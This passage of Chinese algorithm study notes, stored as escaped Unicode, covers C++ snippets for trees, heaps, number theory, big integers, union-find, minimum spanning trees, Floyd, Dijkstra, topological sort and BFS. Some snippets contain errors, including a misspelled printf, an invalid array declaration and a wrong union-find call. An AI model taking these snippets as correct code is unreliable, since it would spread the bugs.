5\u904d\u5386\u5230\u8868\u8fbe\u5f0f\u4e2d\u7684\u6570\u5b57\uff0c\u5219\u76f4\u63a5\u538b\u5165\u6570\u5b57\u6808\n6.\u82e5\u8fd0\u7b97\u7b26\u5806\u6808\u4e2d\u4ec5\u5b58\u6709\u4e24\u4e2a\u8fd0\u7b97\u7b26\u4e14\u6808\u9876\u5143\u7d20\u4e3a\u6211\u4eec\u4eba\u4e3a\u6dfb\u52a0\u7684\u6807\u8bb0\u8fd0\u7b97\u7b26\uff0c\u90a3\u4e48\u8868\u8fbe\u5f0f\u8fd0\u7b97\u7ed3\u675f\uff0c\u6b64\u65f6\u6570\u5b57\u5806\u6808\u4e2d\u552f\u4e00\u7684\u6570\u5b57\u5373\u4e3a\u8868\u8fbe\u5f0f\u7684\u503c\n\n\n\n\u54c8\u592b\u66fc\u6811\n// \u6240\u9700\u5934\u6587\u4ef6\n#include &lt;queue&gt;\nusing namespace std;\n\npriority_queue&lt;int&gt; Q; // \u521b\u5efa\u4e00\u4e2a\u5143\u7d20\u4e3aint\u7684\u5806Q\uff0c\u9ed8\u8ba4\u4e3a\u5927\u9876\u5806\n\npriority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt;&gt; Q; // \u5b9a\u4e49\u4e3a\u5c0f\u9876\u5806\n\nQ.push(x); // \u5c06x\u653e\u5165\u5806\u4e2d\n\nint a = Q.top(); // \u53d6\u5806\u9876\u5143\u7d20\n\nQ.pop(); // \u5f39\u51fa\u5806\u9876\u5143\u7d20\uff0c\u81ea\u52a8\u8c03\u6574\u4e3a\u4e00\u4e2a\u65b0\u7684\u5c0f\u9876\u5806\n\nQ.empty(); // \u5224\u65ad\u5806\u662f\u5426\u4e3a\u7a7a\n\nQ.size(); // \u5806\u4e2d\u5143\u7d20\u4e2a\u6570\n\n// \u81ea\u5b9a\u4e49\u7ed3\u6784\u4f53\nstruct Node{\n    int x, y;\n    bool operator &lt; (const Node&amp; b)const{\n        return y &lt; b.y;\n    }\n}n[100];\npriority_queue&lt;Node&gt; Q;\n\n\n\u54c8\u592b\u66fc\u6811\u6c42\u6cd5\n1.\u5c06\u6240\u6709\u7ed3\u70b9\u653e\u5165\u96c6\u5408K\n2.\u82e5\u96c6\u5408K\u4e2d\u5269\u4f59\u7ed3\u70b9\u5927\u4e8e2\u4e2a\uff0c\u5219\u53d6\u51fa\u5176\u4e2d\u6743\u503c\u6700\u5c0f\u7684\u4e24\u4e2a\u7ed3\u70b9\uff0c\u6784\u9020\u5b83\u4eec\u540c\u65f6\u4e3a\u67d0\u4e2a\u65b0\u7ed3\u70b9\u7684\u5de6\u53f3\u5b50\u7ed3\u70b9\uff0c\u8be5\u65b0\u7ed3\u70b9\u662f\u4ed6\u4eec\u5171\u540c\u53cc\u4eb2\u7ed3\u70b9\uff0c\u8bbe\u5b9a\u5b83\u7684\u6743\u503c\u4e3a\u5176\u4e24\u4e2a\u513f\u5b50\u7ed3\u70b9\u7684\u6743\u503c\u548c\u3002\u5e76\u5c06\u8be5\u7236\u4eb2\u7ed3\u70b9\u653e\u5165\u96c6\u5408K\u3002\u91cd\u590d\u6b65\u9aa42\u548c\u6b65\u9aa43\n3.\u82e5\u96c6\u5408K\u4e2d\u4ec5\u5269\u4e00\u4e2a\u7ed3\u70b9\uff0c\u8be5\u7ed3\u70b9\u5373\u4e3a\u6784\u9020\u51fa\u7684\u54c8\u592b\u66fc\u6811\u7684\u6839\u8282\u70b9\uff0c\u6240\u6709\u6784\u9020\u5f97\u5230\u7684\u4e2d\u95f4\u7ed3\u70b9\u7684\u6743\u503c\u548c\u5373\u4e3a\u8be5\u54c8\u592b\u66fc\u6811\u7684\u5e26\u6743\u8def\u5f84\u548c\n\n\n\n\u4e8c\u53c9\u6811\n// \u6811\u7ed3\u70b9\u7ed3\u6784\u4f53\nstruct Node{\n    Node *lchild;\n    Node *rchild;\n    char c;\n} Tree[110];\n\n// \u7533\u8bf7\u4e00\u4e2a\u7ed3\u70b9\u7a7a\u95f4\uff0c\u8fd4\u56de\u6307\u5411\u5176\u7684\u6307\u9488\nint loc = 0;\nNode *create(){\n    Tree[loc].lchild = Tree[loc].rchild = NULL;\n    return &amp;Tree[loc++];\n}\n\n// \u524d\u5e8f\u548c\u4e2d\u5e8f\u6784\u5efa\u4e8c\u53c9\u6811\nchar str1[30],str2[30];\nNode *build(int s1,int e1,int s2,int e2){\n    Node* ret = create();\n    ret-&gt;c = str1[s1];\n    int rootIdx;\n    for(int i = s2; i &lt;= e2; i++){\n    \tif(str2[i] == str1[s1]){\n    \t\trootIdx = i;\n    \t\tbreak;\n    \t}\n    }\n    if(rootIdx != s2){\n    \tret-&gt;lchild = build(s1+1, s1+(rootIdx-s2), s2, rootIdx-1);\n    }\n    if(rootIdx != e2){\n    \tret-&gt;rchild = build(s1+(rootIdx-s2)+1, e1, rootIdx+1, e2);\n    }\n    return ret;\n}\n\n// \u540e\u5e8f\u904d\u5386\nvoid postOrder(Node *T){\n    if(T-&gt;lchild != NULL)\n    \tpostOrder(T-&gt;lchild);\n    if(T-&gt;rchild != NULL)\n    \tpostOrder(T-&gt;rchild);\n    printf(&quot;%c&quot;,T-&gt;c);\n}\n\n\u4e8c\u53c9\u6392\u5e8f\u6811\n// \u63d2\u5165\u6570\u5b57\nNode *Insert(Node *T,int x){\n    if(T == NULL){\n        T = create();\n        T-&gt;c = x;\n        return T;\n    }\n    else if(x &lt; T-&gt;c){\n        T-&gt;lchild = Insert(T-&gt;lchild, x);\n    }\n    else if(x &gt; T-&gt;c){\n        T-&gt;rchild = Insert(T-&gt;rchild, x);\n    }\n    return T;\n}\n\n\n\u63d2\u5165\u6570\u5b57x\n\n1.\u82e5\u5f53\u524d\u6811\u4e3a\u7a7a\uff0c\u5219x\u4e3a\u5176\u6839\u8282\u70b9\n2.\u82e5\u5f53\u524d\u7ed3\u70b9\u5927\u4e8ex\uff0c\u5219x\u63d2\u5165\u5176\u5de6\u5b50\u6811\uff1b\u82e5\u5f53\u524d\u7ed3\u70b9\u5c0f\u4e8ex\uff0c\u5219x\u63d2\u5165\u5176\u53f3\u5b50\u6811\uff1b\u82e5\u5f53\u524d\u7ed3\u70b9\u7b49\u4e8ex\uff0c\u5219\u6839\u636e\u5177\u4f53\u60c5\u51b5\u9009\u62e9\u63d2\u5165\u5de6\u53f3\u5b50\u6811\u6216\u8005\u76f4\u63a5\u5ffd\u7565\n\n\n\u5220\u9664\u6570\u5b57\n\n1.\u5229\u7528\u67d0\u79cd\u904d\u5386\u627e\u5230\u8be5\u7ed3\u70b9\n2.\u82e5\u8be5\u7ed3\u70b9\u4e3a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219\u76f4\u63a5\u5220\u9664\u5b83\uff0c\u5373\u5c06\u5176\u53cc\u4eb2\u7ed3\u70b9\u4e2d\u6307\u5411\u5176\u7684\u6307\u9488\u6539\u4e3aNULL\u3002\u91ca\u653e\u8be5\u7ed3\u70b9\u7a7a\u95f4\n3.\u82e5\u8be5\u7ed3\u70b9\u4ec5\u4e0d\u5b58\u5728\u53f3\u5b50\u6811\uff0c\u5219\u76f4\u63a5\u5c06\u5176\u5de6\u5b50\u6811\u7684\u6839\u8282\u70b9\u4ee3\u66ff\u5176\u4f4d\u7f6e\u540e\uff0c\u5220\u9664\u8be5\u7ed3\u70b9\u3002\u5373\u5c06\u5176\u53cc\u4eb2\u7ed3\u70b9\u6307\u5411\u5176\u7684\u6307\u9488\u6539\u4e3a\u6307\u5411\u5176\u5de6\u5b50\u6811\u7684\u6811\u6839\n4.\u82e5\u8be5\u7ed3\u70b9\u5b58\u5728\u53f3\u5b50\u6811\uff0c\u5219\u627e\u5230\u53f3\u5b50\u6811\u4e0a\u4e2d\u5e8f\u904d\u5386\u7b2c\u4e00\u4e2a\u88ab\u904d\u5386\u5230\u7684\u7ed3\u70b9\uff0c\u5c06\u88ab\u5220\u9664\u7ed3\u70b9\u7684\u6570\u503c\u6539\u4e3a\u53f3\u5b50\u6811\u4e0a\u6700\u5de6\u4e0b\u7684\u6570\u503c\u540e\uff0c\u5220\u9664\u6700\u5de6\u4e0b\u7ed3\u70b9\n\n\n\n\n\u6570\u5b66\u95ee\u9898\n\u4e00\u822c\u95ee\u9898\n// \u6700\u5927\u516c\u7ea6\u6570\nint gcd(int a, int b){\n    return b != 0 ? gcd(b, a % b) : a;\n}\n\n// \u6700\u5c0f\u516c\u500d\u6570\nint lcm(int a, int b){\n    return a * b / gcd(a, b);\n}\n\n// \u7d20\u6570\u7b5b\u6cd5\n#include &lt;math.h&gt;\nbool judge(int x){\n    if(x &lt;= 1)\n    \treturn false;\n\n    int bound = (int) sqrt(x) + 1;\n\n    for(int i = 2; i &lt; bound ; i++)\n    \tif(x % i == 0)\n    \t\treturn false;\n    \n    return true;\n}\n\n// \u5217\u4e3e\u7d20\u6570\n#define num 10000\nint prime[num];\nint primeSize = 0;\nbool mark[num + 1];\nvoid init(){\n    for(int i = 2; i &lt;= num ; i++){\n    \tif(mark[i] == true)\n    \t\tcontinue;\n    \tprime[primeSize++] = i;\n    \tfor(int j = i * i; j &lt;= num ; j += i)\n    \t\tmark[j] = true;\n    }\n}\n\n\u5206\u89e3\u7d20\u56e0\u6570\n\n\u5206\u89e3n!\u7684\u7d20\u56e0\u5b50\n1.\u8ba1\u7b97\u5668\u6e05\u96f6\uff0c\u8be5\u8ba1\u6570\u5668\u8868\u793an!\u4e2d\u5c06\u6709\u51e0\u4e2ap\u56e0\u5b50\uff0c\u5373n!\u5206\u89e3\u8d28\u56e0\u6570\u540e\u7d20\u56e0\u5b50p\u5bf9\u5e94\u7684\u5e42\u6307\u6570\n2.\u8ba1\u7b97n/p\uff0c\u6709n/p\u4e2a\u6574\u6570\u53ef\u4ee5\u5411n!\u63d0\u4f9b\u4e00\u4e2ap\u56e0\u5b50\uff0c\u5219\u8ba1\u6570\u5668\u7d2f\u52a0n/p\u3002\u82e5n/p\u4e3a0\uff0c\u8868\u793a\u6ca1\u6709\u4e00\u4e2a\u6574\u6570\u80fd\u5411n!\u63d0\u4f9b\u4e00\u4e2a\u6216\u4e00\u4e2a\u4ee5\u4e0a\u7684p\u56e0\u5b50\uff0c\u5206\u89e3\u7ed3\u675f\n3.\u8ba1\u7b97n/(pp)\uff0c\u6709n/(pp)\u4e2a\u6574\u6570\u53ef\u4ee5\u5411n!\u63d0\u4f9b\u4e24\u4e2ap\u56e0\u5b50\uff0c\u5219\u8ba1\u6570\u5668\u7d2f\u52a0n/(pp)\u3002\u82e5n/(pp)\u4e3a0\uff0c\u8868\u793a\u6ca1\u6709\u4e00\u4e2a\u6574\u6570\u80fd\u5411n!\u63d0\u4f9b\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684p\u56e0\u5b50\uff0c\u5206\u89e3\u7ed3\u675f\n4.\u2026\u2026\n\n\n\n\u4e8c\u5206\u6c42\u5e42\nint qpow(int a,int b){\n  int r = 1, base = a;\n  while(b){\n    if(b &amp; 1)\n    \tr *= base;\n    base *= base;\n    b &gt;&gt;= 1;\n  }\n  return r;\n}\n\n\u9ad8\u7cbe\u5ea6\u6574\u6570\n// \u7ed3\u6784\u4f53\n#include &lt;string.h&gt;\n#define maxDigits 1000\nstruct bigInteger{\n    int digit[maxDigits];\n    int size;\n    void init(){\n    \tfor(int i = 0; i &lt; maxDigits; i++)\n    \t\tdigit[i] = 0;\n    \tsize = 0;\n    }\n    void set(char str[]){\n    \tinit();\n    \tint L = strlen(str);\n    \tfor(int i = L - 1, j = 0, t = 0, c = 1; i &gt;= 0; i--){\n    \t\tt += (str[i] - &#39;0&#39;) * c;\n    \t\tj++;\n    \t\tc *= 10;\n    \t\tif(j == 4 || i == 0){\n    \t\t\tdigit[size++] = t;\n    \t\t\tj = 0;\n    \t\t\tt = 0;\n    \t\t\tc = 1;\n    \t\t}\n    \t}\n    }\n    void output(){\n    \tfor(int i = size - 1; i &gt;= 0; i--){\n    \t\tif(i != size - 1)\n    \t\t\tpritf(&quot;%04d&quot;,digit[i]);\n    \t\telse\n    \t\t\tprintf(&quot;%d&quot;,digit[i]);\n    \t}\n    \tprintf(&quot;\\n&quot;);\n    }\n    bigInteger operator + (const bigInteger &amp;A) const{\n    \tbigInteger ret;\n    \tret.init();\n    \tint carry = 0;\n    \tfor(int i = 0; i &lt; A.size || i &lt; size; i++){\n    \t\tint tmp = A.digit[i] + digit[i] + carry;\n    \t\tcarry = tmp / 10000;\n    \t\ttmp %= 10000;\n    \t\tret.digit[ret.size++] = tmp;\n    \t}\n    \tif(carry != 0){\n    \t\tret.digit[ret.size++] = carry;\n    \t}\n    \treturn ret;\n    }\n};\n\n\n\u56fe\u8bba\n\u9884\u5907\u77e5\u8bc6\n// \u5934\u6587\u4ef6\n#include &lt;vector&gt;\nusing namespace std;\n\n// \u7ed3\u6784\u4f53\u8868\u793a\u4e00\u6761\u8fb9\nstruct Edge{\n    int nextNode;\n    int cost;\n};\n\n// vector\u6a21\u62df\u5355\u94fe\u8868\nvector&lt;Edge&gt; edge[N];\n\n// \u521d\u59cb\u5316\uff0c\u6e05\u7a7a\u5355\u94fe\u8868\nfor(int i = 0; i &lt; N; i++)\n    edge[i].clear();\n\n// \u6dfb\u52a0\u4fe1\u606f\nEdge tmp;\ntmp.nextNode = 3;\ntmp.cost = 38;\nedge[1].push_back(tmp);\n\n// \u67e5\u8be2\nfor(int i = 0; i &lt; edge[2].size(); i++){\n    int nextNode = edge[2][i].nextNode;\n    int cost = edge[2][i].cost;\n}\n\n// \u5220\u9664\u7ed3\u70b91\u7684\u5355\u94fe\u8868\u4e2dedge[1][i]\u6240\u5bf9\u5e94\u7684\u8fb9\u4fe1\u606f\nedge[1].erase(edge[1].begin() + i, edge[1].begin() + i + 1);\n\n\u5e76\u67e5\u96c6\n// \u53cc\u4eb2\u8868\u793a\u6cd5\u6765\u8868\u793a\u5404\u68f5\u6811\nint Tree[N];\n\n// \u67e5\u627e\u6839\u7ed3\u70b9\u4e0e\u8def\u5f84\u538b\u7f29\u9012\u5f52\u7248\nint findRoot(int x){\n    if(Tree[x] == -1)\n        return x;\n    else{\n        int tmp = findRoot(Tree[x]);\n        Tree[x] = tmp;\n        return tmp;\n    }\n}\n\n// \u67e5\u627e\u6839\u7ed3\u70b9\u4e0e\u8def\u5f84\u538b\u7f29\u975e\u9012\u5f52\u7248\nint findRoot(int x){\n    int ret;\n    int tmp = x;\n    while(Tree[x] != -1)\n        x = Tree[x];\n    ret = x;\n    x = tmp;\n    while(Tree[x] != -1){\n        int t = Tree[x];\n        Tree[x] = ret;\n        x = t;\n    }\n    return ret;\n}\n\n// \u8fd0\u7528\nint a  = findRoot(Tree[a]);\nint b  = findRoot(Tree[b]);\nif(a != b) //\u82e5\u4e0d\u5c5e\u4e8e\u4e00\u4e2a\u96c6\u5408\n    Tree[a] = b;\n\n\u6700\u5c0f\u751f\u6210\u6811(MST)\n\n\u6700\u5c0f\u751f\u6210\u6811Kruskal\u7b97\u6cd5\n1.\u521d\u59cb\u65f6\u6240\u6709\u7ed3\u70b9\u5c5e\u4e8e\u5b64\u7acb\u7684\u96c6\u5408\n2.\u6309\u7167\u8fb9\u6743\u9012\u589e\u987a\u5e8f\u904d\u5386\u6240\u6709\u7684\u8fb9\uff0c\u82e5\u904d\u5386\u5230\u7684\u8fb9\u4e24\u4e2a\u9876\u70b9\u4ecd\u5206\u5c5e\u4e0d\u540c\u7684\u96c6\u5408\uff08\u8be5\u8fb9\u5373\u4e3a\u8fde\u901a\u8fd9\u4e24\u4e2a\u96c6\u5408\u7684\u8fb9\u4e2d\u6743\u503c\u6700\u5c0f\u7684\u90a3\u6761\uff09\uff0c\u5219\u786e\u5b9a\u8be5\u8fb9\u4e3a\u6700\u5c0f\u751f\u6210\u6811\u4e0a\u7684\u4e00\u6761\u8fb9\uff0c\u5e76\u5c06\u8fd9\u4e24\u4e2a\u9876\u70b9\u5206\u5c5e\u7684\u96c6\u5408\u5408\u5e76\n3.\u904d\u5386\u5b8c\u6240\u6709\u8fb9\u540e\uff0c\u539f\u56fe\u4e0a\u6240\u6709\u7ed3\u70b9\u5c5e\u4e8e\u540c\u4e00\u4e2a\u96c6\u5408\uff0c\u5219\u88ab\u9009\u53d6\u7684\u8fb9\u548c\u539f\u56fe\u4e2d\u6240\u6709\u7ed3\u70b9\u6784\u6210\u6700\u5c0f\u751f\u6210\u6811\uff1b\u5426\u5219\u539f\u56fe\u4e0d\u8fde\u901a\uff0c\u6700\u5c0f\u751f\u6210\u6811\u4e0d\u5b58\u5728\n\n\n\n// \u8fb9\u7ed3\u6784\u4f53\nstruct Edge{\n    int a,b;\n    int cost;\n    bool operator &lt; (const Edge &amp;A) const{\n        return cost &lt; A.cost;\n    }\n}edge[6000];\n\n\u6700\u77ed\u8def\u5f84\n\n\u5168\u6e90\u6700\u77ed\u8def\u5f84 -- Floyd\u7b97\u6cd5\n\u5728\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u8868\u793a\u6cd5\u4e2d\uff0cedge[i][j]\u8868\u793a\u7531\u7ed3\u70b9i\u548c\u7ed3\u70b9j\u4e2d\u95f4\u4e0d\u7ecf\u8fc7\u4efb\u4f55\u7ed3\u70b9\u65f6\u7684\u6700\u77ed\u8ddd\u79bb\uff0c\u90a3\u4e48\u4f9d\u6b21\u4e3a\u4e2d\u95f4\u5141\u8bb8\u7ecf\u8fc7\u7684\u7ed3\u70b9\u6dfb\u52a0\u7ed3\u70b91\u3001\u7ed3\u70b92\u3001\u2026\u2026\u76f4\u5230\u7ed3\u70b9N\uff0c\u5f53\u6dfb\u52a0\u5b8c\u8fd9\u4e9b\u7ed3\u70b9\u540e\uff0c\u4ece\u7ed3\u70b9i\u5230\u7ed3\u70b9j\u5141\u8bb8\u7ecf\u8fc7\u6240\u6709\u7ed3\u70b9\u7684\u6700\u77ed\u8def\u5f84\u957f\u5ea6\u5c31\u53ef\u4ee5\u786e\u5b9a\u4e86\uff0c\u8be5\u957f\u5ea6\u5373\u4e3a\u539f\u56fe\u4e0a\u7531\u7ed3\u70b9i\u5230\u7ed3\u70b9j\u7684\u6700\u77ed\u8def\u5f84\u957f\u5ea6\n\n\n\n/****\n\u8bbeans[k][i][j]\u4e3a\u4ece\u7ed3\u70b9i\u5230\u7ed3\u70b9j\u5141\u8bb8\u7ecf\u8fc7\u7f16\u53f7\u5c0f\u4e8e\u7b49\u4e8ek\u7684\u7ed3\u70b9\u65f6\n\u5176\u6700\u77ed\u8def\u5f84\u957f\u5ea6\u3002\u5982\u4e0a\u6587\uff0cans[0][i][j]\u5373\u7b49\u4e8e\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u8868\u793a\u4e2d\nedge[i][j]\u7684\u503c\u3002\u6211\u4eec\u901a\u8fc7\u5982\u4e0b\u5faa\u73af\uff0c\u5b8c\u6210\u6240\u6709k\u5bf9\u5e94\u7684ans[k][i][j]\n****/\n#define wuqiong -1\nint ans[n+1][n+1][n+1]0; // \u521d\u59cb\u5316\u4e3a-1\uff0c\u81ea\u5df1\u5230\u81ea\u5df1\u4e3a0\uff0c\u65e0\u5411\u56fe\u8d4b\u503c\u4e24\u6b21\nfor(int k = 1; k &lt;= n; k++){\n    for(int i = 1; i &lt;= n; i++){\n    \tfor(int j = 1; j &lt;= n; j++){\n    \t\tif(ans[k-1][i][k] == wuqiong || ans[k-1][k][j] == wuqiong){\n    \t\t\tans[k][i][j] = ans[k-1][i][j];\n    \t\t\tcontinue;\n    \t\t}\n\n    \t\tif(ans[k-1][i][j] == wuqiong || ans[k-1][i][k] + ans[k-1][k][j] &lt; ans[k-1][i][j])\n    \t\t\tans[k][i][j] = ans[k-1][i][k] + ans[k-1][k][j];\n    \t\telse\n    \t\t\tans[k][i][j] = ans[k-1][i][j];\n    \t}\n    }\n}\n\n// \u4e0a\u8ff0\u4ee3\u7801\u7b80\u5316\n#define wuqiong -1\nint ans[n+1][n+1]; // \u521d\u59cb\u5316\u4e3a-1\uff0c\u81ea\u5df1\u5230\u81ea\u5df1\u4e3a0\uff0c\u65e0\u5411\u56fe\u8d4b\u503c\u4e24\u6b21\nfor(int k = 1; k &lt;= n; k++){\n    for(int i = 1; i &lt;= n; i++){\n    \tfor(int j = 1; j &lt;= n; j++){\n    \t\tif(ans[i][k] == wuqiong || ans[k][j] == wuqiong)\n    \t\t\tcontinue;\n    \t\tif(ans[i][j] == wuqiong || ans[i][k] + ans[k][j] &lt; ans[i][j])\n    \t\t\tans[i][j] = ans[i][k] + ans[k][j];\n    \t}\n    }\n}\n\n\n\u5355\u6e90\u6700\u77ed\u8def\u5f84 -- Dijkstra\u7b97\u6cd5\n1.\u521d\u59cb\u5316\uff0c\u96c6\u5408K\u4e2d\u52a0\u5165\u7ed3\u70b91\uff0c\u7ed3\u70b91\u5230\u7ed3\u70b91\u6700\u77ed\u8ddd\u79bb\u4e3a0\uff0c\u5230\u5176\u4ed6\u7ed3\u70b9\u4e3a\u65e0\u7a77\n2.\u904d\u5386\u4e0e\u96c6\u5408K\u4e2d\u7ed3\u70b9\u76f4\u63a5\u76f8\u90bb\u7684\u8fb9\uff08U\uff0cV\uff0cC\uff09\uff0c\u5176\u4e2dU\u5c5e\u4e8e\u96c6\u5408K\uff0cV\u4e0d\u5c5e\u4e8e\u96c6\u5408K\uff0c\u8ba1\u7b97\u7531\u7ed3\u70b91\u51fa\u53d1\u6309\u7167\u5df2\u7ecf\u5f97\u5230\u7684\u6700\u77ed\u8def\u5230\u8fbeU\uff0c\u518d\u7531U\u7ecf\u8fc7\u8be5\u8fb9\u5230\u8fbeV\u65f6\u7684\u8def\u5f84\u957f\u5ea6\u3002\u6bd4\u8f83\u6240\u6709\u4e0e\u96c6\u5408K\u4e2d\u7ed3\u70b9\u76f4\u63a5\u76f8\u90bb\u7684\u975e\u96c6\u5408K\u7ed3\u70b9\u8be5\u8def\u5f84\u957f\u5ea6\uff0c\u5176\u4e2d\u8def\u5f84\u957f\u5ea6\u6700\u5c0f\u7684\u7ed3\u70b9\u88ab\u786e\u5b9a\u4e3a\u4e0b\u4e00\u4e2a\u6700\u77ed\u8def\u5f84\u786e\u5b9a\u7684\u7ed3\u70b9\uff0c\u5176\u6700\u77ed\u8def\u5f84\u957f\u5ea6\u5373\u4e3a\u8fd9\u4e2a\u8def\u5f84\u957f\u5ea6\uff0c\u6700\u540e\u5c06\u8be5\u7ed3\u70b9\u52a0\u5165\u96c6\u5408K\n3.\u82e5\u96c6\u5408K\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u6240\u6709\u7684\u70b9\uff0c\u7b97\u6cd5\u7ed3\u675f\uff1b\u5426\u5219\u91cd\u590d\u6b65\u9aa42\n\n\n\n// \u94fe\u8868\u5143\u7d20\u7ed3\u6784\u4f53\nstruct E\n{\n    int next;\n    int c;\n};\n\n// \u90bb\u63a5\u94fe\u8868\nvector&lt;E&gt; edge[101];\n\n// \u82e5\u4e3atrue\u5219\u4ee3\u8868\u5df2\u52a0\u5165\u96c6\u5408K\nbool mark[101]; \n\n//\u82e5mark[i]\u4e3atrue\uff0c\u5219Dis[i]\u4e3a\u5df2\u5f97\u7684\u6700\u77ed\u8def\u5f84\u957f\u5ea6\nint Dis[101]; \n\n// \u5927\u81f4\u6d41\u7a0b\nwhile(m--){\n    int a, b, c;\n    scanf(&quot;%d %d %d&quot;,&amp;a,&amp;b,&amp;c);\n    E tmp;\n    tmp.c = c;\n    tmp.next = b;\n    edge[a].push_back(tmp);\n    tmp.next = a;\n    edge[b].push_back(tmp); // \u7531\u4e8e\u8fd9\u91cc\u662f\u65e0\u5411\u56fe\uff0c\u6240\u4ee5\u4e24\u8fb9\u90fd\u6dfb\u52a0\u8fdb\u5355\u94fe\u8868\u4e2d\n}\nfor(int i = 1; i &lt;= n; i++){ // \u521d\u59cb\u5316\n    Dis[i] = -1; // \u6240\u6709\u7ed3\u70b9\u4e3a\u4e0d\u53ef\u8fbe\n    mark[i] = false; // \u6240\u6709\u7ed3\u70b9\u90fd\u4e0d\u5c5e\u4e8e\u96c6\u5408K\n}\nDis[1] = 0; // \u5f97\u5230\u6700\u8fd1\u7684\u70b9\u4e3a\u7ed3\u70b91\uff0c\u957f\u5ea6\u4e3a0\nmark[1] = true; // \u5c06\u7ed3\u70b91\u52a0\u5165\u96c6\u5408K\nint newP = 1; // \u5f53\u524d\u96c6\u5408k\u4e2d\u52a0\u5165\u7684\u65b0\u7ed3\u70b9\u4e3anewP\uff0c\u5373\u5176\u503c1\nfor(int i = 1; i &lt; n; i++){ // \u5faa\u73afn-1\u6b21\n    for(int j = 0; j &lt; edge[newP].size(); j++){\n    \tint t = edge[newP][j].next;\n    \tint c = edge[newP][j].c;\n    \tif(mark[t] == true)\n    \t\tcontinue;\n    \tif(Dis[t] == -1 || Dis[t] &gt; Dis[newP] + c)\n    \t\tDis[t] = Dis[newP] + c;\n    }\n    int min = 0x7fffffff;  //\u6700\u5c0f\u503c\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u5927\u6574\u6570\uff0c\u4e3a\u627e\u6700\u5c0f\u503c\u505a\u51c6\u5907\n    for(int j = 1; j &lt;= n; j++){\n    \tif(mark[j] == true)\n    \t\tcontinue;\n    \tif(Dis[j] == -1)\n    \t\tcontinue;\n    \tif(Dis[j] &lt; min){\n    \t\tmin = Dis[j];\n    \t\tnewP = j;\n    \t}\n    }\n    mark[newP] = true;\n}\n\n\u62d3\u6251\u6392\u5e8f\n\n\u6761\u4ef6\uff1a\u6709\u5411\u65e0\u73af\u56fe\n\u9996\u5148\uff0c\u6240\u6709\u6709\u5165\u5ea6\u7684\u7ed3\u70b9\u5747\u4e0d\u53ef\u80fd\u6392\u5728\u7b2c\u4e00\u4e2a\u3002\u90a3\u4e48\uff0c\u9009\u62e9\u4e00\u4e2a\u5165\u5ea6\u4e3a0\u7684\u7ed3\u70b9\uff0c\u4f5c\u4e3a\u5e8f\u5217\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u3002\u5f53\u8be5\u7ed3\u70b9\u88ab\u9009\u4e3a\u5e8f\u5217\u7684\u7b2c\u4e00\u4e2a\u9876\u70b9\u540e\uff0c\u5c06\u8be5\u70b9\u4ece\u56fe\u4e2d\u5220\u53bb\uff0c\u540c\u65f6\u5220\u9664\u4ee5\u8be5\u7ed3\u70b9\u4e3a\u5f27\u5c3e\u7684\u6240\u6709\u8fb9\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u56fe\u3002\u90a3\u4e48\u8fd9\u4e2a\u65b0\u56fe\u7684\u62d3\u6251\u5e8f\u5217\u5373\u4e3a\u539f\u56fe\u7684\u62d3\u6251\u5e8f\u5217\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u540e\u5269\u4f59\u7684\u5e8f\u5217\u3002\u540c\u6837\uff0c\u5728\u65b0\u56fe\u4e0a\u9009\u62e9\u4e00\u4e2a\u5165\u5ea6\u4e3a0\u7684\u7ed3\u70b9\uff0c\u5c06\u5176\u4f5c\u4e3a\u539f\u56fe\u7684\u7b2c\u4e8c\u4e2a\u7ed3\u70b9\uff0c\u5e76\u5728\u65b0\u56fe\u4e2d\u5220\u53bb\u8be5\u70b9\u4ee5\u53ca\u4ee5\u70b9\u4e3a\u5f27\u5c3e\u7684\u8fb9\u3002\u8fd9\u6837\u53c8\u5f97\u5230\u4e86\u4e00\u5f20\u65b0\u56fe\uff0c\u91cd\u590d\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u76f4\u5230\u6240\u6709\u7684\u7ed3\u70b9\u548c\u8fb9\u90fd\u4ece\u539f\u56fe\u4e2d\u5220\u53bb\u3002\u82e5\u5728\u6240\u6709\u7ed3\u70b9\u5c1a\u672a\u88ab\u5220\u53bb\u65f6\u5373\u51fa\u73b0\u4e86\u627e\u4e0d\u5230\u5165\u5ea6\u4e3a0\u7684\u7ed3\u70b9\u7684\u60c5\u51b5\uff0c\u5219\u8bf4\u660e\u5269\u4f59\u7684\u7ed3\u70b9\u5f62\u6210\u4e00\u4e2a\u73af\u8def\uff0c\u62d3\u6251\u6392\u5e8f\u5931\u8d25\uff0c\u539f\u56fe\u4e0d\u5b58\u5728\u62d3\u6251\u5e8f\u5217\u3002\n\n// \u5934\u6587\u4ef6\n#include &lt;queue&gt;\n\n// \u5efa\u7acb\u4e00\u4e2a\u961f\u5217\nqueue&lt;int&gt; Q;\n\n// \u5165\u961f\nQ.push(x);\n\n// \u8bfb\u53d6\u961f\u5934\u5143\u7d20\nx = Q.front();\n\n// \u961f\u5934\u5143\u7d20\u5f39\u51fa\nQ.pop();\n\n// \u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\nQ.empty();\n\n\u641c\u7d22\n\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08BFS\uff09\n\n\u5173\u952e\u5b57\uff1a\n1.\u72b6\u6001\u3002\u6211\u4eec\u786e\u5b9a\u6c42\u89e3\u95ee\u9898\u4e2d\u7684\u72b6\u6001\u3002\u901a\u8fc7\u72b6\u6001\u7684\u8f6c\u79fb\u6269\u5c55\uff0c\u67e5\u627e\u904d\u5386\u6240\u6709\u7684\u72b6\u6001\uff0c\u4ece\u800c\u4ece\u4e2d\u5bfb\u627e\u6211\u4eec\u9700\u8981\u7684\u7b54\u6848\n2.\u72b6\u6001\u6269\u5c55\u65b9\u5f0f\u3002\u5728\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u5c3d\u53ef\u80fd\u6269\u5c55\u72b6\u6001\uff0c\u5e76\u5c06\u5148\u6269\u5c55\u5f97\u51fa\u7684\u72b6\u6001\u5148\u8fdb\u